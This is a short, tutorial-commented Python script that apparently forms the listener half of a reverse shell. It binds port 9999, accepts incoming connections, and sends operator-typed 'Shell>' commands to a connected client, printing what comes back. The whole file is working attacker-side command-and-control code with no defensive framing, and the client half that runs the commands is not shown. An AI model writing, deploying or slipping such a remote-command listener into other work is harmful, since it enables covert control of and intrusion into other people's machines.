import socket
import sys

#Create a Socket
def Create_socket():
    try:
        # We will declare global var to be able to access them outside the func
        global host
        global port
        global s  # socket
        host = ""  # will pop later
        port = 9999  # we will use 9999 as it is not popular
        s = socket.socket()  # create a socket object
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind the socket
def Bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port " + str(port))

        s.bind((host, port))  # .bind is a socket method thats a tuple
        s.listen(5)  # allow 5 connections
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        Bind_socket()  # if error, try again


# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | IP: " + address[0] + " | Port: " + str(address[1]))
    send_commands(conn)  # call the function to send commands
    
    conn.close()


# Send commands to the client
def send_commands(conn):
    while True:
        cmd = input("Shell> ")
        if cmd == "quit":
            conn.close() # close the connection
            s.close() # close the server socket
            sys.exit() # exit the function
        if len(cmd) > 0:
            conn.send(cmd.encode())
            response = conn.recv(1024).decode()
            print(response, end="")


# Main function to start the server
def main():
    Create_socket()
    Bind_socket()
    while True:
        socket_accept()

main()  # call the main function to start the server
